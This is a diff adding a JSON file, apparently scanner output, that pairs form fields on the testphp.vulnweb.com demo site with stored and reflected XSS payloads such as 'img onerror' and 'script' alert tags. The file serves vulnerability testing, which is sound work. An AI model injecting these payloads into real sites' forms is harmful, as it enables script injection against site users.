@@ -1,0 +1,112 @@
+[
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/",
+        "form_method": "post",
+        "input_name": "name",
+        "input_type": "hidden",
+        "html": "<input type=\"hidden\" name=\"name\" value=\"test\">",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "<img src=x onerror=alert('Stored XSS')>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/",
+        "form_method": "post",
+        "input_name": "name",
+        "input_type": "hidden",
+        "html": "<input type=\"hidden\" name=\"name\" value=\"test\">",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "\"><svg onload=alert('Stored XSS')></svg>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/",
+        "form_method": "post",
+        "input_name": "text",
+        "input_type": "textarea",
+        "html": "<textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "<img src=x onerror=alert('Stored XSS')>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/",
+        "form_method": "post",
+        "input_name": "text",
+        "input_type": "textarea",
+        "html": "<textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "\"><svg onload=alert('Stored XSS')></svg>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/",
+        "form_method": "post",
+        "input_name": "searchFor",
+        "input_type": "text",
+        "html": "<input name=\"searchFor\" type=\"text\" size=\"10\">",
+        "attack_type": "XSS",
+        "xss_type": "Reflected XSS",
+        "payload": "><img src=x onerror=alert('Reflected XSS')>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/",
+        "form_method": "post",
+        "input_name": "searchFor",
+        "input_type": "text",
+        "html": "<input name=\"searchFor\" type=\"text\" size=\"10\">",
+        "attack_type": "XSS",
+        "xss_type": "Reflected XSS",
+        "payload": "<script>alert('Reflected XSS')</script>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+        "form_method": "post",
+        "input_name": "name",
+        "input_type": "hidden",
+        "html": "<input type=\"hidden\" name=\"name\" value=\"test\">",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "<img src=x onerror=alert('Stored XSS')>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+        "form_method": "post",
+        "input_name": "name",
+        "input_type": "hidden",
+        "html": "<input type=\"hidden\" name=\"name\" value=\"test\">",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "\"><svg onload=alert('Stored XSS')></svg>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+        "form_method": "post",
+        "input_name": "text",
+        "input_type": "textarea",
+        "html": "<textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "<img src=x onerror=alert('Stored XSS')>"
+    },
+    {
+        "page_url": "http://testphp.vulnweb.com/",
+        "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+        "form_method": "post",
+        "input_name": "text",
+        "input_type": "textarea",
+        "html": "<textarea name=\"text\" rows=\"5\" wrap=\"VIRTUAL\" style=\"width:500px;\"></textarea>",
+        "attack_type": "XSS",
+        "xss_type": "Stored XSS",
+        "payload": "\"><svg onload=alert('Stored XSS')></svg>"
+    }
+]
